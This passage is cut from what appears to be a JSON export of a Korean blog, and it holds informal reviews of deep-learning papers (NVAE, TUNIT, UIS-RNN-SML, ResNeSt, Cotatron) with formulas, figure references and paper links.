하네요.\n\n![img](architecture.png)\n\n### Residual Cells for VAE\n\n일반적으로 long-range correlations 를 잘 잡아내기 위한 방법으론 *hierarchical multi-scale model* 을 사용하는 건데,\n그냥 이걸 썼다는 정도 입니다.\n\n### Residual Cells for Generative Model\n\nnetwork 의 receptive field 크기를 늘릴 수록 long-range correlations 을 잡는데 유리하다고 설명하는데,\n일반적으로는 encoder / decoder 에 사용된 residual network 안에 convolution kernel size 를 늘리면 되겠지만,\n그냥 늘리면 computation 이 엄청 늘어나니까, 이걸 depth-wise separable convolution 을 사용해 해결합니다.\n\n![img](residual_blocks.png)\n\nMobileNet-V2 에서 언급되었던 것 처럼, depth-wise convolution 하나만 으로 대채만 하는 건,\n각 channel 따로따로 동작하는 연산특 때문에 표현성(?)에서 제한이 있어서, 위 그림처럼 conv 1x1 으로 채널을 뻥튀기 해 준 후에 depthwise conv 5x5 를 적용합니다.\n\n#### BatchNormalization\n\n위에서 언급했듯, BN 은 training instability 때문에 BN 대신 WN (Weight Normalization) 을 사용했는데,\n\n이 논문에서, 실제 BN 의 문제는 evaluation 시, slow-moving running statistics 값 때문에 shifted 돼서, output 이 dramatic 하게 바뀔수 있다는 점이라 말하면서,\n이 문제를 해결하기 위해 BN momentum 값을 batch statistics 을 빠르게 잘 잡도록 변경을 해 줬다고 합니다.\n\n또한, scaling parameter 에 norm regularization 도 해 줬다고 합니다.\n\n### Residual Cells for Bidirectional Encoder\n\nencoder 에서는 depth-wise convolution 이 효과가 없어서 그냥 regular convolution 사용했다고 합니다.\n\n### Taming the Unbounded KL Term\n\ndeep hierarchical VAE 를 훈련하는데 있어, unbounded KL 를 optimize 하기엔 어렵다는 말을 쭉 합니다.\n\n그래서 KL 를 잘 optimize 하고 stable 하게 훈련할 수있는 방법들을 제안합니다.\n\n#### Residual Normal Distributions\n\n> $p(z_{l}^{i}\\|z_{<l}) = \\mathcal{N} (\\mu_{i} (z_{<l}), \\sigma_{i} (z_{<l}))$ 가 $i^{th}$ variable in $z_{l}$ prior 가 normal  이라 하면,\n\n아래와 같이 정의해 볼 수 있습니다.\n\n> $q(z_{l}^{i}\\|z_{<l}, x) = \\mathcal{N} (\\mu_{i} (z_{<l}) + \\Delta \\mu_{i} (z_{<l}, x), \\sigma_{i} (z_{<l}) + \\Delta \\sigma_{i} (z_{<l}, x))$\n\n여기서 *delta* 들은 *prior* 와*approximate posterior* 의 relative location & scale 입니다.\n\n> $KL (q(z^{i}\\|x)\\|\\|p(z^{i})) = (\\frac{\\Delta \\mu_{I}^{2}}{\\sigma_{i}^{2}} + \\Delta \\sigma_{i}^{2} - log \\sigma_{i}^{2} - 1) / 2$\n\n만약 decoder output 인 $\\sigma_{i}$ 가 bounded below 면, 위 KL term 이 공식에 나온 것 처럼, encoder output 인 relative parameter 에 영향을 많이 받게됩니다.\n\n즉, $q(z_{l}^{i}\\|z_{<l}, x)$ 가 absolute location & scale 일 때, 요 KL term 으로 minimization 하기 쉬워지는걸 의도했네요.\n\n#### Spectral Regularization\n\n위에서 제안한 *Residual Normal Distributions* 만으로 stablize 하기 어렵다고 생각해 (아직 unbounded 기 때문),\nbound KL 을 만들기 위해, input changes 에 output 이 dramatic 하게 변하면 안된다는게 보장돼야 합니다 ~> **smoothness**.\n그래서 이 연구에선 Lipschitz constant 를 regularizing 함으로 bounded 를 ensure 함을 가정합니다.\n\n이어서, Lipschitz constant 를 측정하기는 힘드니, *Spectral Regularization* 을 각 layer 에 적용을 합니다. (lipschitz constant 를 minimize 해 주는 scheme 에서), loss term 에도 해당 regularization term 을 추가해서 minimize 합니다.\n\n> $L_{SR} = \\lambda \\sum_{i} s^{(i)}$, $s(i)$ 는 $i^{th}$ convolution 의 largest singular value\n\n#### More Expressive Approximate Posteriors with Normalizing Flow\n\n지금 구조는 *approximate posterior* 를 각 group 에서 병렬로 샘플하기 좋은 구조로 돼있는데 (상대적으로 작은 parameter 수, 등등), 조금 다르게 말하면, less expressive 하다고 말할 수 있다.\n\n더 expressive 하게 만들기 위해 normalizing flow 몇 개를 추가해서 더 expressive 하게 만들자가 목적이다.\n\nencoder 에만 해당 normalization flow 가 추가되면,\n\n1. IAF (Inverse Autoregressive Flows) 가능 (따른 명시적으로 inverse 해 주는 flow 필요 x)\n2. sampling time 도 flow 덕문에 증가하지 않을 거다.\n\n라는 장점을 듭니다.\n\n## Experiment Result\n\n###  Quantitative Performance Benchmark\n\nbits/dimension (bpd) metric 에서 SOTA 에 해당하는 성능을 보이네요.\n\n![img](performance_benchmark.png)\n\n### Generations\n\n![img](generated_images.png)\n\n## Conclusion\n\n개인적으로 NVIDIA 연구들은 보면 StyleGANv2 도 그렇고 network design 으로 문제를 해결해 나가는 모습을 많이 보이는데, 이번에도 어썸했다.\n\n또, 연구를 진행하고 결과를 내는 것들이 대단하다 생각하지만,\n최근 들어 VAE 쪽 논문들이 큰 novelty 없이 생산되는(?) 경향이 있었는데, 오랜만에 개인적으로 괜찮다 생각되는 AE 논문이 나온거 같아서 기분이가 좋았다.\n\n결론 : 굳굳굳\n","excerpt":"TL;DR 최근에 NVLabs 에서 VAE 관련 논문이 하나 나왔는데, 매주 월요일이 회사 짬데이라고 개인 or 팀 끼리 공부하고 싶은 주제 공부하고 공유하는 문화가 있어서, 마침 잘 돼서 논문 리뷰를 해 봅니다. paper : arXiv code …","fields":{"slug":"/NVAE/"},"frontmatter":{"date":"Sep 07, 2020","title":"NVAE A Deep Hierarchical Variational Autoencoder","tags":["Deep-Learning"],"update":"Sep 07, 2020"},"timeToRead":8}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n최근에 Clova AI 에서 unsupervised image 2 image translation 관련 논문이 나와서 한번 빠르게 봤습니다.\n\n일단 제목부터가 재밌는데 TUNIT, **Truly** Unsupervised Image to Image Translation 의 약자입니다. \n요즘 unsup, semi-sup 이라 하면서, 사실은 supervised 인 approach 들이 있어서 그런지, 이거는 **찐**이다 라는 걸 제목부터 보여주고 싶었나 보네요.\n\n~~헛소리였고.~~,  reproducible 가능한 코드도 논문 공개와 같이 돼서 좋네요. \n\npaper : [arXiv](https://arxiv.org/pdf/2006.06500.pdf)\n\ncode : [github](https://github.com/clovaai/tunit)\n\n## Related Work\n\nImage-to-Image Translation 쪽 papers 이 정도만\n\n* CyCleGAN : [paper](https://arxiv.org/pdf/1703.10593.pdf)\n* UNIT : [paper](https://arxiv.org/pdf/1703.00848.pdf)\n* MUNIT : [paper](https://arxiv.org/pdf/1804.04732.pdf)\n* FUNIT : [paper](https://arxiv.org/pdf/1905.01723.pdf)\n* StyleGAN-v2 : [post](http://kozistr.tech/deep-learning/2020/02/29/StyleGANv2.html)\n* StarGAN-v2 : [post](http://kozistr.tech/deep-learning/2020/02/10/StarGANv2.html)\n\n## Introduce\n\n이전에도 여러 i2i translation approaches 가 존재했지만, \n주로 연구들이 set-level 에서 multimodal translate 할 때, domain label 이 필요하다는 점이 있었고,\n이런 문제를 해결하기 위해 pre-trained classifier 를 adopt 해서 domain info 를 extract 하는 방식들의 접근이 있었어요.\n또 self-supervised 방식으로 mutual information maximization 를 통해 각 이미지들을 잘 cluster 하려는 시도도 있었습니다.\n\n하지만 real-world data 들은 label 들을 주로 구하기 힘든 문제들이 존재하니, \n그럼 어떻게 unlabelled data 로 (unsupervised) i2i translate 를 잘 할 수 있을지를 해결한 논문입니다.\n\n## Method\n\n![img](tunit-architecture.png)\n\n위 이미지가 전반적인 TUNIT architecture 인데요, 크게 3 종류의 network 로 구성돼있습니다.\n\n* Network E : Guiding Network\n* Network D : Discriminator\n* Network G : Generator\n\n### Guiding Network\n\n이 논문의 핵심(?)인 network 인 guiding network 인데요, \n해당 network 에서는 input image 를 입력받으면, *pseudo label* 과 *style code (embedding)* 을 줍니다.\n\n*pseudo label* 은 network 가 예측한 해당 domain 의 class 가 되겠고, *style code* 는 해당 image 의 style 을 담고 있는 embedding 일 겁니다.\n\n#### Unsupervised Domain Classification\n\n하지만, 여기선 image domain 에 대한 label 을 구할 수가 없는데요, 대략 임의의 class 수 ($K$, e.g) 5, 10, 20)를 잡습니다. (K 잡는 게 NetVLAD 비슷한 느낌 하네요)\n\n그리고 다른 unsupervised method 에서 주로 사용하는 방식인 augmentation (e.g) random cropping, horizontal flip, ....)을 통해서 각 domain 의 cluster 를 학습하는데, \n여기서 mutual information (MI) 를 maximize 하는 방식으로 진행하게 됩니다.\n\n> $I(p,p^+) = H(p) - H(p\\|p^+)$, $p = E_{class}(x)$\n\n여기서 image $x$ 라 하면, $x^+$ 는 augmented image $x$ 이고, $p$ 는 K domains 에 대한 확률값이라 볼 수 있겠습니다. (softmax 가 정확히는 확률값은 아니지만)\n\nentropy $H(p)$ 가 maximize, cond entropy $H(p\\|p^+)$ 가 minimize 되면서, \n결과적으로 해당 MI 가 maximize 되면, 모든 samples 들이 K domains 에 골고루 분포되면서,\naugmented 된 domain 들에 대해선 같은 domain 으로 묶겠죠?\n\n위 공식을 entropy loss scheme 으로 다시 써 보면 아래처럼 됩니다.\n\n> $L_{MI}$ = $I(p,p^+)$ = $I(P)$ = $\\sum_{i=1}^{K} \\sum_{j=1}^{K} P_{ij} \\log \\frac{P_{ij}}{P_{i}P_{j}}$, $P_{ij} = P(p = i, p^+ = j)$\n\n#### Improving Domain Classification\n\nimage 가 higher-resolution & complex 하고 diverse 하는 문제를 극복하기 위해 \ndomain classification 이외에 auxiliary branch 로 style code 를 뽑아 여기에 contrastive loss 를 붙였습니다.\n\n> $L_{style}^E = - log \\frac{exp(s \\cdot s^+ / \\Gamma)}{\\sum_{i=0}^N exp(s \\cdot s_{i}^- / \\Gamma)}$\n\n이런 식인데, contrastive loss 목적처럼 positive pair 는 가깝게, negative pair 는 멀리 보내는 역할을 합니다.\n\n이 method 적용으로 위 method 하나만 사용했을 때 보다 약 35% 정도 AnimalFaces 에서 classification accuracy 가 증가했다고 하네요.\n\n### Discriminator & Generator\n\n두 개 다 특별한 거 없이, discriminator 는 multi-task discriminator (K classes) 고, \ngenerator 도 guiding network E 에서 오는 style code 기반으로 이미지를 생성하는 network 입니다. \n\nadv loss 도 simple 한 vanilla gan loss 를 사용하네요.\n\n#### Style Contrastive Loss\n\n> $L_{style}^G = - log \\frac{exp(s^{'} \\cdot s^~ / \\Gamma)}{\\sum_{i=0}^N exp(s^{'} \\cdot s_{i}^- / \\Gamma)}$\n\n$s^{'} = E_{style}(G(x, s^~))$, $s^{'}$ 는 생성된 이미지에 대한 style 이고 (positive), - 는 negative style.\n\n위 loss function 을 사용하면 ref image x 에 대해 생성된 이미지가 유사해지니 (positive 는 유사, negative 는 안 유사),\nguiding network E 가 모든 이미지를 하나의 style code 로 뽑는 것도 막을 수 있겠죠. (여기서 only recon loss 만 사용할 때 문제)\n\n#### Reconstruction Loss\n\n여기도 특별한 건 없고, image x 와 해당 style s 에 대해 생성된 이미지와의 L1 loss 를 minimize 합니다.\n\n### Total Loss\n\n> $L_{D} = - L_{adv}$\n> $L_{G} = L_{adv} + \\lambda_{style}^G L_{style}^G + \\lambda_{rec} L_{rec}$\n> $L_{E} = L_{G} - \\lambda_{MI} L_{MI} + \\lambda_{style}^E L_{style}^E$\n\n## Experiment Result\n\n### Translation Loss on AnimalFaces-10\n\n$L_{style}$, $L_{rec}$ 없을 때 하고 풀버전(?) 하고 거의 유사하긴 하지만, 모두 적용했을 때가 제일 FID 가 좋네요.\n\n![img](translation-loss.png)\n\n### t-SNE visualization of the style space\n\n$K = 10$ 설정일 때, style code 들이 얼마나 cluster 별 domain style 을 뽑고 있나 봤을 때, \n잘 분리하고 있는 걸 보여줍니다.\n\n![img](t-SNE-vis.png)\n\n## Conclusion\n\n재밌는 approach 들을 사용했고 (arbitrary K classes, MI maximization, style contrastive learning), \n결과도 이전 연구 성능보다 outperform 해서 좋았습니다.\n\n결론 : 굳\n","excerpt":"TL;DR 최근에 Clova AI 에서 unsupervised image 2 image translation 관련 논문이 나와서 한번 빠르게 봤습니다. 일단 제목부터가 재밌는데 TUNIT, Truly Unsupervised Image to Image…","fields":{"slug":"/TUNIT/"},"frontmatter":{"date":"Jun 16, 2020","title":"TUNIT Rethinking the Truly Unsupervised Image-to-Image Translation","tags":["Deep-Learning"],"update":"Jun 16, 2020"},"timeToRead":5}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n평소에 speaker diarization task 에 정말 관심이 많고, 이전에 이쪽 분야 (speech domain 쪽 전반적으로) 업무를 하다가, \n최근에 다시 이쪽 분야 trend 는 어떤지 궁금해서 예전에 UIS-RNN 기반으로 speaker diarization pipeline 구현하던 게 생각나서 찾아보다 발견해서 읽게 됐습니당.\n\npaper : [arXiv](https://arxiv.org/pdf/1911.01266.pdf)\n\ncode : [github](https://github.com/DonkeyShot21/uis-rnn-sml)\n\n## Related Work\n\nDL approach Speaker Diarization 논문들\n\n* UIS-RNN : [paper](https://arxiv.org/pdf/1810.04719.pdf)\n* BLSTM-EEND : [paper](https://arxiv.org/pdf/1909.05952.pdf)\n* SA-EEND : [apper](https://arxiv.org/pdf/1909.06247.pdf)\n* RPNSD : [paper](https://arxiv.org/pdf/2002.06220.pdf)\n* DNCSD : [paper](https://arxiv.org/pdf/1910.09703.pdf)\n\n## Introduce\n\n18년도에 구글에서 `UIS-RNN` 이란 `d-vector` based feature extractor speaker diarization 이 나왔는데, \nSample Mean Loss (SML) 을 사용해 speaker 의 turn behavior 를 더 잘 잡는다고 합니다.\n\n결론적으로 이번에 제안한 method 가 online method 에서 `UIS-RNN` 보다 성능이 올라갔고, offline method 에서 AHC (Agglomerative Hierachical Clustering) w/ PLDA scoring 과 비슷한 성능을 낸다고 캅니다.\n\n## Proposed Approach\n\nembeddings $X = (x_1, ..., x_T)$, speaker labels $Y = (y_1, ... y_T)$ (T는 no of frames) 이라고 할 때,\ndiarization task 를 확률 모델 적으로 아래 식으로 joint probability 를 maximize 할 수 있죠\n\n> $ \\hat{Y}  = arg max_{Y} P(X, Y)$ \n\n이 문제를 online generative problem 으로 바꿔본다면, 식이 아래와 같이 써 볼 수 있겠죠?\n\n> $p(x_t, y_t, z_t\\|x_{[t-1]}, y_{[t-1]} z_{[t-1]}) = p(x_t\\|x_{[t-1]}, y_t) * p(y_t\\|y_{[t-1]}, z_t)) * p(z_t\\|z_{[t-1]})), (time  t)$\n\n$x_t, y_t, z_t$ 에 대한 조건부 확률을 순서대로 보면 \n\n* $x_t$ : sequence generation\n* $y_t$ : assignment (speaker)\n* $z_t$ : speaker change\n\n`UIS-RNN` 에서...\n\n* **speaker change** 는 coin flipping process 로 $p_0$ 란 transition parameter 1개로 처리 되었고\n* **speaker assignment** 는 distance dependent Chinese Restaurant Process (ddCRP) 로 bayesian non-parametric process 로 풀었고 (time domain 에서 얼마나 화자가 교차로 배치되었는지?)\n* **sequence generation** 은 GRU (Gated Recurrent Unit) 을 사용해서 처리\n\n### UIS-RNN\n\n기존의 `UIS-RNN`은 아래와 같은 diagram 처럼 훈련이 되고 있는데요,\n\n![img](uis-rnn.png)\n\nDataset $D = {(X_1, ..., X_M), (Y_1, ..., Y_M)}$ ($M$, sequences of embeddings, related labels) 이라 하면, \n$\\theta^*$ 를 통해 아래와 같은 log likelihood 를 minimizing 시키는 겁니다.\n\n>  $L = \\sum_{m=1}^{D} - ln p(X_m\\|Y_M;\\theta)$\n\n위에 sequence generation 에 대한 formula 와 바로 위 log likelihood 식을 MSE fashion 으로 적어보면 다음과 같습니다.\n\n> $L_{MSE} = \\sum_{i=1}^{\\|D_A\\|} \\sum_{j=1}^{\\|A_i\\|} \\|\\|a_{i,j} - \\mu (GRU_{\\theta} (a_{i, [j-1]}))\\|\\|^2$\n\n또, data augmentation 을 진행하는데, S 명의 화자, P permutations 가 적용된다면, $D_A = (A_1, ..., A_{S \\times P})$, \neach sequence 인 $A_i = (a_{i,1}, ..., a_{i,L_i} \\in D_A$ 들은 concat 되고 random 하게 permute 됩니다.\n\n그런데 여기서 sequences 가 shuffle 된다면, 다음에 어떤 embedding 이 와야하는 지, observation 간의 어떠한 관계를 학습을 못하게 되죠.\n위 공식과 같이 네트워크는 각 embedding 들의 mean distribution 을 예측하도록 학습되겠죠!\n\n### UIS-RNN-SML\n\n이번 논문에서 제안한`UIS-RNN-SML`은 아래와 같은 diagram 처럼 훈련이 되고 있는데요,\n\n![img](uis-rnn-sml.png)\n\n이전 `UIS-RNN` 과 비슷하지만, $1 ~ j-1 th$ embeddings 와 $j ~ L th$ embeddings 부분을 sampling 해서 똑같이 mean 해서 구한 후 MSE 를 구해줍니다.\n\n이렇게 $j - 1 th$ 이후의 sequence 를 sampling 해서 mean 해서 구한다고 해서 네이밍을 Sample Mean Loss 라고 했군요.\n\n그럼 공식은 조금 변형되서 이렇게 되겠네요\n\n> $L_{MSE} = \\sum_{i=1}^{\\|D_A\\|} \\sum_{j=1}^{\\|A_i\\|} \\|\\|E(s(i)) - \\mu (GRU_{\\theta} (a_{i, [j-1]}))\\|\\|^2$, $s(i)$ = embedding distribution of i-th speaker\n\n하지만 실제 probability distribution 은 없기도 하고 제한된 레이블된 데이터로 하다보면 overfit 될 거 같은 느낌이 들 거 같다면서, \nunseen samples 에 대한 mean 을 예측하는 network 를 위해 gt 를 만들었다고 하네요. \n\npermuted sequence 에서 직접 랜덤하게 가져왔다는데, generic sequence $A_i$ 에 대한 subset $H = (h_1, ..., h_N)$, $N$ 은 랜덤하게 sample 된 embedding,\n즉, $\\hat{\\mu_A} (A_i) = (\\sum_{i}^{N} h_i) / N$ 로 써 볼 수 있겠네요. ($N$ 이 아니라 $N - i$ 아닌가)\n\n그럼 식을 다시 써 보면 이렇게 되겠네요.\n\n> $L_{SML} = \\sum_{i=1}^{\\|D_A\\|} \\sum_{j=1}^{\\|A_i\\|} \\|\\|\\hat{\\mu_A}(a_{i,[j,L_i}) - \\mu (GRU_{\\theta} (a_{i, [j-1]}))\\|\\|^2$\n\n### New Speaker Probability\n\n이전에 `UIS-RNN` 의 큰 장점 중 하나가 unbounded 된 화자 수를 모델링 했다는 점인데 (ddCRP), 이전에 보였던 화자와 새롭게 등장한 화자로 switching 이 잘 된다는 점 입니다.\n\n아래처럼 써 볼 수 있을텐데,\n\n> $p(y_t = k\\|z_t = 1, y_{[t-1]}) \\propto N_{k,t-1}$\n\n> $p(y_t = max(y_{[t-1}) + 1\\|z_t = 1, y_{[t-1]}) \\propto \\alpha$\n\n$N_{k,t-1}$ 은 speaker $k$ 에 대한 연속적인 segment 들. 여기서는 $\\alpha$ 란 parameter 하나에 의해 결정됩니다. 만약 $\\alpha$ 가 크다면 speaker 수를 과대평가(?) 할 수도 있겠죠.\n\n그래서 이 부분을 다시 제안하는데,\n\n$\\alpha = \\frac{\\sum_{m=1}^{D} (max(Y_m) - 1)}{\\sum_{m=1}^{D} \\sum_{t=1}^{Y_m} 1 (y_{m,t} \\ne y_{m,t+1})}$\n\n이렇게 하면 잘못된 metric 이나 휴리스틱하게 결정되는 거로부터 방지가 가능하겠죠\n\n## Experiment Result\n\n### DIHARD-2 Benchmark\n\n해당 dataset 에서 evaluate 했을 때, UIS-RNN 보다 outperform 한 성능을 보여주네요.\n\n![img](dihard2-benchmark.png)\n\n각 환경에 따른 DER (Diarization Error Rate) 변화도 보여줬는데, Audiobooks 이외엔 전부 outperform 합니다. \n\n이 부분을 논문에서도 설명하는데, `UIS-RNN-SML` 은 `평균`을 더 잘 맞추려 하고, cluster 간 variance 가 작다는 점에서 대부분의 cases 에선 잘 동작하는데,\n화자 수가 거의 없는 환경에서는 performance degradation 이 존재할거라 합니다 (by $\\alpha$, $p_0$).  \n\n![img](dihard2-domain-benchmark.png)\n\n### Cluster Mean Variance (at training time)\n\nSML 적용으로 cluster 간 variance 가 stable 해진 점도 굳\n\n![img](cluster-mean-variance.png)\n\n## Conclusion\n\n`UIS-RNN` 같은 경우엔 `d-vector` 을 feature extractor 로 사용하는데 v1 ~ v3 까지 dataset 과 training recipe 차이에 따라 엄청난 성능 비약이 있어서,\n요걸 실제로 재현하거나 훈련할 수가 없었습니다. \n\n이전에 직접 훈련한 feature extractor 기반으로 했는데 좋은 성능을 기대하진 못했습니다 ㅠㅠ\n\n물론 아직도 더 많은 종류의 dataset, 더 좋은 training recipe 에 따라 (feature extractor 의 성능) \nspeaker diarization 성능이 어쩌면 (당연하게?) 결정된다고 생각하는데, 더 많은 dataset 과 pre-trained 모델이 공개되면 좋겠다란 바람이 있네요!\n\n그래도 해당 논문은 `x-vector` 기반으로 재현을 하였고, `SML loss` 사용이 전 make sense 하고 좋은 method 라 생각해서 재밌게 읽었습니다!\n\n특히 cluster 별 mean variance 가 거의 일정하게 낮음을 유지하는 부분이 인상적 이였고, \nspeaker embedding 을 extract 할 때 `x-vector` 가 아닌 구글이 가지고 있는 `d-vector v3` 을 사용했으면 얼마나 더 좋은 성능이 나왔을 지도 궁금해 지네요.\n\n결론 : 굳굳\n","excerpt":"TL;DR 평소에 speaker diarization task 에 정말 관심이 많고, 이전에 이쪽 분야 (speech domain 쪽 전반적으로) 업무를 하다가,\n최근에 다시 이쪽 분야 trend 는 어떤지 궁금해서 예전에 UIS-RNN 기반으로 s…","fields":{"slug":"/UIS-RNN-SML/"},"frontmatter":{"date":"Jun 06, 2020","title":"UIS-RNN-SML SUPERVISED ONLINE DIARIZATION WITH SAMPLE MEAN LOSS FOR MULTI-DOMAIN DATA","tags":["Deep-Learning"],"update":"Jun 06, 2020"},"timeToRead":7}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\nAmazon 에서 지난달에 재밌는 논문이 나왔는데요, 새로운 image classification architecture 를 제안했는데, \nEfficientNet 보다 더 좋은 성능을 보이는 human-made architecture 를 선보였습니다. 멋지죠?\n\n핵심은 *Split-Attention* 을 사용하는것 인데요, 자세한 건 본문에\n\n결론은 ImageNet 에서 새로운 SOTA 를 찍었습니다.\n\npaper : [arXiv](https://arxiv.org/pdf/2004.08955.pdf)\n\ncode : [github](https://github.com/zhanghang1989/ResNeSt)\n\n## Related Work\n\nResNet 계열 논문들\n\n* ResNet : [paper](https://www.cv-foundation.org/openaccess/content_cvpr_2016/papers/He_Deep_Residual_Learning_CVPR_2016_paper.pdf)\n* ResNetV2 : [paper](https://arxiv.org/pdf/1603.05027.pdf)\n* ResNeXt : [paper](https://arxiv.org/pdf/1611.05431.pdf)\n\n## Introduce\n\nintroduction 에서는 크게 2가지 문제점들을 들면서 소개하는데요,\n\n### Computation\n\n최근에 EfficientNet 같은 architecture 들을 보면 ImageNet 에서 정말 높은 acc 를 보여주고 있는데요,\n그런데 성능은 정말 좋지만, AutoML 로 architecture search 를 하다 보니, accuracy 는 고려돼도, training efficiency 는 고려하지 못해서, 실제로 이걸\ntraining 하려고 하면 **computation cost 가 꽤 많이 듭니다**.\n\n### Transfer Learning\n\n위 architecture 들을 backbone 으로 하는 downstream task 들을 훈련할 때도 한계점으로 듭니다.\n\n주로 ResNet 기반의 architecture 를 사용했는데, 요런 backbone 들은 해당 downstream task 에 optimal 한 구조가 아니기 때문에 (lack of receptive field, cross-channel interaction)\n해당 task 들에 맞게 구조를 바꿔야 한다고 합니다.\n\n또한, 실제로 EfficientNet 을 backbone 으로 사용할 때 다른 architecture 보다 성능이 고만고만한 경우도 꽤 있어요. (기대한 만큼 x)\n\n요약하면, **cross-channel representation 을 잘 뽑아주는 구조**가 필요하다 입니다.\n\n## Architecture\n\n아래는 이번 논문에서 제안한 *Split-Attention* 이 적용된 block 입니다.\n\n![img](resnest-blocks.png)\n\n왼쪽부터 순서대로 *SE-Net block*, *SK-Net block*, *ResNeSt block* 입니다.\n\n*ResNeSt* 는 *ResNeXt* 와 *SK-Net* concept 을 합친 거라 보시면 될 듯 합니다.\n\n### Split-Attention Networks\n\n*Split-Attention* block 은 크게 2가지 part 로 구성되어 있는데, *feature-map group*, *split-attention operation* 입니다.\n\n*feature-map group* 은 ResNeXt 에 나오는 concept 이니 핵심인 *split-attention* 부분만 다뤄 보겠습니다.\n\n![img](split-attention-block.png)\n\n1. 각 cardinal group 에서 $r$ 개의 splits 들에 대해 element-wise 하게 sum 해줍니다.\n> $\\hat{U}^k = \\sum_{j=R(k-1)+1}^{R_k} U_j$ , $\\hat{U}^k \\in \\Bbb{R}^{H \\times W \\times C / K}$ for $k \\in 1, ..., K$\n2. GAP 로 spatial features 를 squeeze 해 줍니다.\n3. *Dense $c'$ + BN + ReLU* -> *Dense $c$* 로 excitation 하고\n5. attention feature 와 original feature 하고 element-wise 하게 mul 해 주고\n6. 마지막으로 element-wise 하게 sum 해 줍니다.\n\n### ResNeSt Block\n\n위 *Split-Attention* block 들이 각 cardinal group 별로 적용된 후에 모두 concat 후에 conv 1x1 되고 skip connection 이 element-wise sum 되는 형태 입니다.\n\n만약 down-sample 되는 block 이라면 \nskip-connect 부분이 channel size alignment 를 위해 strided convolution or convolution + pooling 이 될 수 있다고 하네요.\n\n### Etc (computation, etc)\n\nnetwork 디자인을 봤을 때 computation 적으로 training 시 이전 구현체들 보다 효율적이다 등등을 말하네요\n\n## Training Recipe\n\n요약\n\n1. average down-sampling : 이전 ResNet 들은 strided conv 3x3 w/ (zero padding) 로 pooling 함 -> avg pool 3x3 으로 pooling (zero-padding boundary 처리는 dense prediction task 에 sub-optimal 함)\n2. tweak ResNet-D : stem conv kernel size 가 7x7 -> conv 3x3 3층 (same receptive field 가지며, 더 computation 효율적으로)\n3. learning rate : lr = 0.1 로 5 epochs warm-up, cosine scheduling, $lr = B/256 * lr_base$\n4. BN : $\\gamma$ = 0 으로 init\n5. label smoothing 함\n6. AutoAugment 씀\n7. MixUp 씀\n8. Large Crop Size\n9. Regularization : DropBlock (p = 0.2) 씀, l2 weight decay\n\n## Experiment Result\n\n### ImageNet\n\n#### ResNet based Benchmark\n\nResNet 계열 architecture benchmark 결과인데 제일 좋은 top-1 acc 를 보입니다.\n\n![img](imagenet-benchmark-resnet-based.png)\n\n#### SOTA Benchmark\n\n이전 다른 SOTA 들하고 비교해 봐도 latency / accuracy 둘다 더 좋은 성능을 보여주네용\n\n![img](imagenet-benchmark.png)\n\n### Transfer Learning Task\n\nDownstream tasks 에서도 좋은 결과를 보이고 있습니다.\n\n#### Object-Detection Benchmark\n\n![img](object-detection-benchmark.png)\n\n#### Instance Segmentation Benchmark\n\n![img](instance-segmentation-benchmark.png)\n\n#### Semantic Segmentation Benchmark\n\n![img](semantic-segmentation-benchmark.png)\n\n## Conclusion\n\n요즘 architecture 들은 주로 baseline 구조에 AutoML 를 이용한 architecture search 가 이뤄지고 있는데,\n이렇게 아직도 사람이 만든 architecture 에 대한 연구가 나오고 있고, 더 좋은 성능을 냈다는 게 정말 인상적이네요.\n\n또 전에 구글에서 나온 논문 무언가에서 ResNet 의 모든 convolution 을 attention 으로 교체했더니 더 좋은 성능이 나왔다는 걸 본 적이 있는데,\n여기서도 뭔가 더 아이디어를 얻어 볼 수 있을 것 같네요.\n\n아마 제가 못 찾아본 거일 수도 있지만, Amazon 연구를 별로 본 기억이 없었는데, 이번 연구는 꽤 재밌었어요.\n\n결론 : 굳굳굳\n","excerpt":"TL;DR Amazon 에서 지난달에 재밌는 논문이 나왔는데요, 새로운 image classification architecture 를 제안했는데,\nEfficientNet 보다 더 좋은 성능을 보이는 human-made architecture 를 선…","fields":{"slug":"/ResNeSt/"},"frontmatter":{"date":"May 23, 2020","title":"ResNeSt Split-Attention Networks","tags":["Deep-Learning"],"update":"May 23, 2020"},"timeToRead":5}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n최근 mindslab 에서 VC (Voice Conversion)관련 논문이 나와서 오랜만에 요 쪽 domain 도 볼 겸 해서 논문을 읽게 됐습니다.\n\n간단하게 요약하면, 유명한 google 의 TTS model 인 *tacotron2* 기반으로 given transcription 와 mel alignment 를 활용해서 speaker-independent linguistic representation 을 뽑는 concept(?) 입니다.\n\n결론은 VCTK dataset 에서 최근 paper 인 *Blow* 보다 높은 MOS, DMOS 를 달성했습니다. 아래 링크에 들어가면 모델이 생성한 sample 들을 들어볼 수 있어요.\n\npaper : [arXiv](https://arxiv.org/pdf/2005.03295.pdf)\n\ndemo : [link](https://mindslab-ai.github.io/cotatron/)\n\ncode : 아직 official code / pre-trained model은 없는데, 곧 나올 예정인 듯합니다\n\n## Related Work\n\n이전 SOTA 였던 paper\n\n* Blow : [arXiv](https://arxiv.org/pdf/1906.00794.pdf)\n\n## Architecture\n\n*Cotatron*의 전체적인 architecture 는 아래와 같습니다.\n\n![img](cotatron-architecture.png)\n\n### 1. speaker-independent linguistic features from TTS\n\n이번에 제안한 *cotatron* 은 google 의 *tacotron2* 를 기반으로 합니다. \n\n> $\\hat{M_{1:i}} , A_i = Decoder (Encoder(T), M_{0:i-1}, z^{id})$\n\n*T* 는 Transcription, *M* 은 log mel-spectogram, *z* 는 speaker representation.\n\n요거로부터 mel alignment + given transcription + speaker representation 으로 새로운 speech 를 생성합니다.\n\n이 이후가 중요(?)한데, TTS 훈련 후에, \nDecoder output 으로 transcription 과 mel-spectogram 사이의 *Alignment* 가 나오는데, 요 부분을 training 할 때 *teacher-forcing* 기술을 사용해서 훈련했다고 합니다.\n\n그래서 최종적으로 Speaker-Independent linguistic features 는 다음과 같습니다.\n\n> $L = matmul(A, Encoder_{text}(T))$\n\n그런데 한 가지 짚어야 할 점은, \n*T* 는 speaker 에 대한 정보가 없는 text 고, \n*A* 는 간단히 text 와 mel spectogram 과의 coef 라 할 수 있는데,\n즉, *L* 이 speaker 에 대한 정보를 담고 있지 않다는 점이다. 이 부분은 아래에\n\n*Cotatron*은 이미 *Tacotron2* 기반의 모델이라 multi-speaker speech synthesis 에 well-optimized 됐을 거지만,\n조금 더 잘해 보려고(?) 기존의 embedding table 을 걷어내고, speaker representation encoder 를 하나 만들어 